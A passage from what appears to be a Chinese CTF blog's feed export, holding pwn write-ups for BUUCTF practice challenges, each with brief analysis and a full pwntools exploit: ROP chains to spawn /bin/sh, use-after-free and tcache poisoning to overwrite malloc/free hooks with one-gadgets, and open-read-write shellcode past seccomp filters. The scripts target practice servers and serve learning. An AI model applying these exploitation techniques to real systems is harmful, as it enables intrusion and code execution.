:io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()one = 0x804857D# debug()payload = &#39;%13$p&#39;sla(&#39;name&#39;,payload)ru(&#39;0x&#39;)key = int(r(8),16) - 0x40 + 0x8info_addr(&#39;key&#39;,key)payload = p32(one)*9 + p32(key)sla(&quot;?&quot;,payload)itr()</code></pre><p>å¤šè°ƒè¯•ï¼Œä¼šæ›´å®¹æ˜“ç†è§£ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DASCTFå®‰æ’æœˆèµ›-7th&quot;&gt;&lt;a href=&quot;#DASCTFå®‰æ’æœˆèµ›-7th&quot; class=&quot;headerlink&quot; title=&quot;DASCTFå®‰æ’æœˆèµ›(7th)&quot;&gt;&lt;/a&gt;DASCTFå®‰æ’æœˆèµ›(7th)&lt;/h1&gt;&lt;p&gt;åªåšå‡ºä¸ªç­¾åˆ°é¢˜ï¼Œtclã€‚ã€‚ã€‚&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTFæš‘å‡åˆ·é¢˜(1)</title>
    <link href="http://chumen77.xyz/2020/07/10/BUUCTF%E6%9A%91%E5%81%87%E5%88%B7%E9%A2%98/"/>
    <id>http://chumen77.xyz/2020/07/10/BUUCTFæš‘å‡åˆ·é¢˜/</id>
    <published>2020-07-10T13:16:13.644Z</published>
    <updated>2020-10-10T12:21:34.242Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTFæš‘å‡åˆ·é¢˜-1"><a href="#BUUCTFæš‘å‡åˆ·é¢˜-1" class="headerlink" title="BUUCTFæš‘å‡åˆ·é¢˜(1)"></a>BUUCTFæš‘å‡åˆ·é¢˜(1)</h1><h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a><code>cmcc_simplerop</code></h2><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é™æ€é“¾æ¥ã€‚32ä½ç¨‹åºã€‚ç”¨<code>int 80h</code> è¿™ä¸ªä¸­æ–­è°ƒç”¨ï¼Œå‘¼å«ç³»ç»Ÿè°ƒç”¨ç¨‹åº<code>system_call()</code>.ã€‚</p><p>ç„¶årop æ§åˆ¶EAX = 0Xb = 11ï¼ŒEBX = &amp;(â€œ/bin/shâ€), ECX = EDX = 0ï¼Œå³æ‰§è¡Œäº†<code>sys_execve(&quot;/bin/sh&quot;, 0, 0, 0)</code>ï¼Œå³å¯æ‹¿åˆ°shellã€‚</p><p>32ä½ç³»ç»Ÿè°ƒç”¨è¡¨ï¼š<a href="https://blog.csdn.net/xiaominthere/article/details/17287965" target="_blank" rel="noopener">https://blog.csdn.net/xiaominthere/article/details/17287965</a></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./simplerop&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29124)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()offset = 32start = 0x8048E45read = 0x806CD50pop_eax_ret = 0x080bae06pop_ebx_ret = 0x080481c9pop_ecx_ebx_ret = 0x0806e851pop_edx_ret = 0x0806e82apop3_ret = 0x08048913bss = 0x80EC2EC - 0x10ret = 0x8048E6Fin_t_0x80 = 0x080493e1payload = &#39;a&#39; * offset + flat([read,pop3_ret,0,bss,0x8])payload += flat([pop_eax_ret,11,pop_ecx_ebx_ret,0,bss,pop_edx_ret,0,in_t_0x80])sa(&#39;:&#39;,payload)s(&#39;/bin/sh\x00&#39;)itr()</code></pre><p>å…¶ä¸­ropé“¾readåè¿”å›åœ°å€ï¼š<code>pop3_ret</code>ï¼Œæ˜¯ä¸ºäº†pop <code>0,bss,0x8</code>ï¼Œç„¶åå†è·Ÿç€ropã€‚</p><h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a><code>ciscn_2019_n_3</code></h2><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>Ubuntu 18 ,å­˜åœ¨UAFæ¼æ´ã€‚</p><pre><code class="c">int __cdecl rec_str_free(void *ptr){  free(*((void **)ptr + 2));  free(ptr);  return puts(&quot;Note freed!&quot;);}</code></pre><p>æ¯åˆ›å»ºä¸€ä¸ªå †ï¼Œå°±æœ‰ä¸€ä¸ª0x10çš„å †ç©ºé—´ï¼Œå­˜æ”¾å‡½æ•°æŒ‡é’ˆã€‚ä¸€çœ‹åˆ°è¿™ä¸ªï¼Œå°±å¯ä»¥è¯´æ˜¯æš—ç¤ºæ”»å‡»è¿™ä¸ªåœ°æ–¹æ¥åŠ«æŒç¨‹åºæµç¨‹ã€‚</p><pre><code class="c">int do_del(){  int v0; // eax  v0 = ask((int)&quot;Index&quot;);  return (*(int (__cdecl **)(int))(records[v0] + 4))(records[v0]);}</code></pre><p>åˆ©ç”¨è¿™ä¸ªå‡½æ•°æ¥åŠ«æŒç¨‹åºæµç¨‹ã€‚<br>å…ˆ<code>new(0,2,0x40,payload)</code>çœ‹ä¸€ä¸‹ç¨‹åºçš„å†…å­˜æƒ…å†µ, å¯¹äºå…¶ä¸­çš„<code>(*(int (__cdecl **)(int))(records[v0] + 4))(records[v0])</code> ï¼š</p><pre><code class="c">gefâ¤  p &amp;records$1 = (&lt;data variable, no debug info&gt; *) 0x804b080 &lt;records&gt;gefâ¤  x/wx 0x804b0800x804b080 &lt;records&gt;:    0x08635160gefâ¤  x/wx 0x086351600x8635160:      0x080486de</code></pre><p>æ‰€ä»¥ <code>records[v0]</code>  = 0x08635160 </p><pre><code class="c">gefâ¤  x/wx 0x08635160+40x8635164:      0x08048725gefâ¤  x/i 0x08048725   0x8048725 &lt;rec_str_free&gt;:    push   ebp</code></pre><p>æ‰€ä»¥ <code>*(int (__cdecl **)(int))(records[v0] + 4))</code>  = <code>0x8048725 &lt;rec_str_free&gt;:</code></p><p>ä¸”<br><img src="http://qiqianyun.chumen77.xyz/uPic/VT03Ns.png" srcset="/img/loading.gif" alt><br>å¦‚å›¾ï¼ŒæŠŠè¿™é‡Œçš„å‡½æ•°æŒ‡é’ˆæ§åˆ¶æˆ<code>sh\x00\00</code> + <code>&amp;system</code> ,å³æ‰§è¡Œ<code>do_del</code>æ—¶ï¼Œè¿è¡Œçš„å°±æ˜¯<code>system(sh)</code>å¯æ‹¿åˆ°shellã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_2019_n_3&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;../libc.so.6context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,26453)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def new(id,type,len,context):    sla(&quot;CNote &gt;&quot;,&#39;1&#39;)    sla(&quot;dex &gt;&quot;,str(id))    sla(&quot;Type &gt;&quot;,str(type))    sla(&quot;th &gt;&quot;,str(len))    sa(&quot;ue &gt;&quot;,str(context))def free(id):    sla(&quot;CNote &gt;&quot;,&#39;2&#39;)    sla(&quot;dex &gt;&quot;,str(id))def show(id):    sla(&quot;CNote &gt;&quot;,&#39;3&#39;)    sla(&quot;dex &gt;&quot;,str(id))payload = &quot;a&quot; + &#39;\n&#39;new(0,2,0x40,payload)new(1,2,0x40,payload)free(1)free(0)system = elf.plt[&#39;system&#39;]new(2,2,0x9,&#39;sh\x00\x00&#39;+ p32(system))free(1)itr()</code></pre><h4 id="æ— systemå‡½æ•°æƒ…å†µä¸‹"><a href="#æ— systemå‡½æ•°æƒ…å†µä¸‹" class="headerlink" title="æ— systemå‡½æ•°æƒ…å†µä¸‹"></a>æ— systemå‡½æ•°æƒ…å†µä¸‹</h4><p>Leak libcï¼Œè¿˜æ˜¯æ”»å‡»é‚£ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œæœ¬åœ°é€šè¿œç¨‹æ²¡é€šã€‚</p><p>åœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œç”±äºfgetsæ€»æ˜¯åœ¨ä½ ä¼ å…¥çš„å­—ç¬¦ä¸²ååŠ ä¸Š<code>\x00</code>ï¼Œæ›¾ç»å°±é‡åˆ°<br>è¿‡ï¼Œå¯¼è‡´æ³„æ¼ååˆ†éš¾è¿›è¡Œï¼Œä½†æ˜¯å‘ç°ï¼š</p><pre><code class="python">payload = &#39;&#39;new(2,2,0x0,payload)ru(&quot;lue=&quot;)libc_base = uu32(r(4)) - 0x1d89d8</code></pre><p>ä¼ å…¥ç©ºå­—èŠ‚ç«Ÿç„¶å¯ä»¥é€šè¿‡ï¼Œä¸”æ²¡æœ‰åŠ ä¸Š<code>\x00</code>ï¼Œä»è€Œä¸å½±å“æ³„æ¼libcã€‚è¿˜ä¸çŸ¥é“æ˜¯å¦ä»¥åé‡åˆ°fgetså‡½æ•°å°±å¯ä»¥è¿™æ ·å¤„ç†å…¶å½±å“ï¼Œå…ˆæŒ–ä¸ªå‘ï¼Œè®°å½•ç€ã€‚</p><pre><code class="python">payload = &#39;a&#39; + &#39;\n&#39;new(0,2,0x400,payload)new(1,2,0x400,payload)free(0)payload = &#39;&#39;new(2,2,0x0,payload)ru(&quot;lue=&quot;)libc_base = uu32(r(4)) - 0x1d89d8info_addr(&quot;libc_base&quot;,libc_base)payload = &#39;\x00&#39;*4 + &#39;/bin/sh\x00&#39; +&#39;\n&#39;new(3,2,0x400-0x10-0x10,payload)new(4,2,0x40,payload)new(5,2,0x40,payload)free(5)free(4)rec = libc_base + 0x3d123new(6,2,0x9,p32(rec) + p32(rec))# free(5)show(5)# debug()itr()</code></pre><h2 id="V-amp-N2020easyTHeap"><a href="#V-amp-N2020easyTHeap" class="headerlink" title="V&amp;N2020easyTHeap"></a>V&amp;N2020easyTHeap</h2><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>Ubuntu 18 ,å­˜åœ¨UAFæ¼æ´ï¼Œtcache dupæ”»å‡»ã€‚</p><p>è€ƒç‚¹ï¼š</p><ul><li>æ”»å‡»<code>tcache_perthread_struct</code>ï¼Œä¼ªé€ tcacheå·²ç»æ»¡äº†</li><li>æ”»å‡»<code>tcache_entry</code>ï¼Œåœ¨æŒ‡å®šçš„ä½ç½®å†™ä¸Šç›®æ ‡åœ°å€ï¼Œåœ¨ç”³è¯·ä¸€ä¸ªå¯¹åº”å¤§å°çš„å †ï¼Œå³å¯å®ç°ä»»æ„åœ°å€å†™å…¥ã€‚<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3></li></ul><pre><code class="python">from pwn import *import timelocal_file  = &#39;./vn_pwn_easyTHeap&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc-2.27.so&#39;remote_libc = &#39;./libc-2.27.so&#39;context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,25814)    libc = ELF(remote_libc)elf = ELF(local_file)# libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size):    sla(&quot;choice&quot;,&#39;1&#39;)    sla(&quot;?&quot;,str(size))def edit(idx,context):    sla(&quot;choice&quot;,&#39;2&#39;)    sla(&#39;idx&#39;,str(idx))    sa(&#39;content&#39;,str(context))def show(idx):    sla(&#39;choice&#39;,&#39;3&#39;)    sla(&#39;idx&#39;,str(idx))def free(idx):    sla(&#39;choice&#39;,&#39;4&#39;)    sla(&quot;idx&quot;,str(idx))add(0x100) #0add(0x100) #1free(0)free(0)show(0)r()heapbase = uu64(r(6)) - 0x260info_addr(&#39;heapbase&#39;,heapbase)add(0x100) #2edit(2,p64(heapbase+0x10))add(0x100) #3add(0x100) #4edit(4,&#39;\x07&#39;*0x10)free(0)show(0)r()libc_base = uu64(r(6)) - 0x3ebca0info_addr(&#39;libc_base&#39;,libc_base)__malloc_hook = libc_base + 0x3ebc30__realloc_hook = __malloc_hook -0x8payload = &#39;\x00&#39; * (8+7) + &#39;\x01&#39; + &#39;\x00&#39; * (0x80 - 8 - 8) + &#39;\x00&#39; * 0x38 + p64(__realloc_hook)edit(4,payload)add(0x100) #5onerec = 0x10a38c + libc_baserealloc_addr = libc_base + libc.symbols[&#39;__libc_realloc&#39;]info_addr(&#39;relloc&#39;,realloc_addr)info_addr(&#39;__malloc_hook&#39;,__malloc_hook)payload = p64(onerec) + p64(realloc_addr+8)edit(5,payload)add(0x100)#debug()itr()</code></pre><h2 id="ciscn-2019-final-3"><a href="#ciscn-2019-final-3" class="headerlink" title="ciscn_2019_final_3"></a><code>ciscn_2019_final_3</code></h2><h3 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>Ubuntu 18ï¼Œä¿æŠ¤å…¨å¼€ï¼Œå­˜åœ¨uafæ¼æ´ã€‚</p><p>ç¨‹åºåªæœ‰å¢åŠ å’Œåˆ é™¤çš„åŠŸèƒ½ï¼Œä½†æ˜¯å¢åŠ ä¸€ä¸ªå †å—åå›ç»™ä½ è¿”å›ç”³è¯·å †å—çš„åœ°å€ä¿¡æ¯ã€‚</p><pre><code class="c"> printf(&quot;gift :%p\n&quot;, heaplist[HIDWORD(size)]);</code></pre><p>åˆ é™¤å †åï¼Œæ²¡æœ‰ç½®0çš„æ“ä½œï¼Œå­˜åœ¨uafã€‚</p><p>è€ƒç‚¹ï¼š</p><ul><li>æ”»å‡»<code>tcache_perthread_struct</code>ï¼Œä¼ªé€ tcacheå·²ç»æ»¡äº†</li><li>æ”»å‡»<code>tcache_entry</code>ï¼Œåœ¨æŒ‡å®šçš„ä½ç½®å†™ä¸Šç›®æ ‡åœ°å€ï¼Œåœ¨ç”³è¯·ä¸€ä¸ªå¯¹åº”å¤§å°çš„å †ï¼Œå³å¯å®ç°ä»»æ„åœ°å€å†™å…¥ã€‚</li></ul><p>éš¾ç‚¹ï¼š</p><ul><li>æ³„æ¼libcåœ°å€</li><li>ç²¾å·§çš„æ„é€ ä¸€ä¸ªä»»æ„åœ°å€å†™ï¼ˆåœ¨<code>tcache struct</code>å¤„æŠ˜è…¾ï¼‰</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="c">from pwn import *import timelocal_file  = &#39;./ciscn_final_3&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,27714)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = []realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)sea     = lambda delim,data         :io.sendafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size,content):    sla(&quot;&gt;&quot;,&#39;1&#39;)    sla(&#39;index&#39;,str(idx))    sla(&#39;size&#39;,str(size))    sa(&#39;thing&#39;,str(content))    ru(&quot;0x&quot;)    gift = int(r(12),16)    info_addr(&#39;gift&#39;,gift)    return giftdef free(idx):    sla(&quot;&gt;&quot;,&#39;2&#39;)    sla(&quot;index&quot;,str(idx))heap_base = add(0,0x48,&#39;a&#39;) - 0x11e70free(0)free(0)add(1,0x48,p64(heap_base+0x10))add(2,0x48,p64(heap_base+0x10))payload = 0x30 * &#39;\x07&#39;add(3,0x48,payload)free(3)payload = 0x30 * &#39;\x00&#39;add(4,0x48,payload)add(5,0x10,&#39; &#39;)libc_base = add(6,0x78,&#39; &#39;) - 0x3ebca0info_addr(&#39;libc_base&#39;,libc_base)free_hook = libc_base + 0x3ed8e8free(5)add(7,0x10,p64(free_hook)*2)one_rec = 0x4f322 + libc_baseadd(8,0x48,p64(one_rec))# debug()free(4)itr()</code></pre><p>è°ƒè¯•ä¸€ä¸‹å°±æ‡‚äº†ã€‚å…¶ä¸­0x10é‚£ä¸ªå †å—çš„ç”³è¯·å¾ˆé‡è¦ï¼Œæ­£å¥½å¯ä»¥ä¾›åé¢çš„ä½¿ç”¨ã€‚</p><h2 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a><code>picoctf_2018_rop chain</code></h2><h3 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>åªæ˜¯ä¸€ä¸ªç®€å•çš„ropï¼Œè€ƒçš„å°±æ˜¯32ä½ä¸‹å¦‚ä½•æ§åˆ¶ä¼ å‚æ•°ã€‚</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./PicoCTF_2018_rop_chain&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,29550)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;] #,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = []realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()win_function1 = 0x080485CBwin_function2 = 0x80485D8flag = 0x0804862Boffset = 0x18 + 4ru(&#39;Enter your input&gt;&#39;)payload = &#39;a&#39; * offset + flat([win_function1,win_function2,flag,0xBAAAAAAD,0xDEADBAAD])# debug()s(payload + &#39;\n&#39;)itr()</code></pre><h2 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a><code>pwnable_orw</code></h2><h3 id="åˆ†æ-5"><a href="#åˆ†æ-5" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è€ƒç‚¹ ï¼š</p><ul><li>ç®€å•shellcode çš„ç¼–å†™</li><li>seccompï¼ˆæŒ–å‘ï¼‰</li></ul><p><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p><p><a href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/" target="_blank" rel="noopener">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/P0Ku7D.png" srcset="/img/loading.gif" alt></p><p>å…ˆç”¨<code>seccomp-tools</code>çœ‹ä¸‹ç¦ç”¨äº†ä»€ä¹ˆå‡½æ•°ï¼š</p><pre><code>âœ  pwnable_orw seccomp-tools dump ./orw line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38) 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</code></pre><p>æ˜æ˜¾åªèƒ½æ‰§è¡Œ open read wirte å‡½æ•°ã€‚</p><pre><code>#è¿™é‡Œå¯ä»¥ç”¨pwntoolsåº“çš„ä¸€ä¸ªå‡½æ•°ä»£æ›¿,shellcraftcè¯­è¨€:open(&quot;/home/orw/flag&quot;) &lt;==&gt; æ±‡ç¼–:asm(shellcraft.open(&quot;/home/orw/flag&quot;))cè¯­è¨€:read(3,buf,0x20)&lt;==&gt; æ±‡ç¼–:asm(shellcraft.read(3,&quot;esp&quot;,0x20)cè¯­è¨€:write(1,buf,0x20)&lt;==&gt;æ±‡ç¼–:asm(shellcraft.write(1,&quot;esp&quot;,0x20))</code></pre><p>å…¶ä¸­ å°±æ˜¯ä»¥espå½“åšä¸´æ—¶å˜é‡ bufçš„åœ°å€ï¼Œå…¶å¯ä»¥è‡ªå®šä¹‰ã€‚</p><p>å…¶ä¸­openå‡½æ•°æ‰§è¡Œåï¼Œç”±äºæ˜¯æ‰“å¼€äº†ä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œå…¶è¿”å›çš„fdå°±æ˜¯3ï¼Œæ‰€ä»¥åé¢è·Ÿç€çš„readçš„æ–‡ä»¶æè¿°ç¬¦ä¹Ÿä¸º3ã€‚</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./orw&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,26224)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = []realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()bss = 0x804A128 - 0x30payload= asm(shellcraft.open(&quot;./flag&quot;))payload += asm(shellcraft.read(3,bss,0x30))payload += asm(shellcraft.write(1,bss,0x30))sl(payload)itr()</code></pre><h2 id="V-amp-N2020-å…¬å¼€èµ›warmup"><a href="#V-amp-N2020-å…¬å¼€èµ›warmup" class="headerlink" title="V&amp;N2020 å…¬å¼€èµ›warmup"></a>V&amp;N2020 å…¬å¼€èµ›warmup</h2><h3 id="åˆ†æ-6"><a href="#åˆ†æ-6" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å¼€å¯äº†æ²™ç›’ï¼Œä½¿ç”¨orwè·å–flagå³å¯ã€‚</p><pre><code>Here is my gift: 0x7f411f85c9c0 line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011 0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010 0006: 0x20 0x00 0x00 0x00000024  A = count &gt;&gt; 32 # write(fd, buf, count) 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010 0008: 0x20 0x00 0x00 0x00000020  A = count # write(fd, buf, count) 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0011: 0x06 0x00 0x00 0x00000000  return KILL</code></pre><p>å…¶ä¸­ï¼Œè¿™é¢˜å› ä¸ºåªæœ‰<code>0x10</code>çš„æº¢å‡ºç©ºé—´ï¼ŒçŒ›çš„ä¸€çœ‹éœ€è¦æ ˆè¿ç§»ï¼Œä½†æ˜¯ä¼šå‘ç°ä¸çŸ¥é“å¾€å“ªé‡Œè¿ç§»ã€‚çœ‹äº†å¸ˆå‚…ä»¬çš„åšå®¢æ‰çŸ¥é“ï¼Œç”±äºç¬¬ä¸€ä¸ªæ 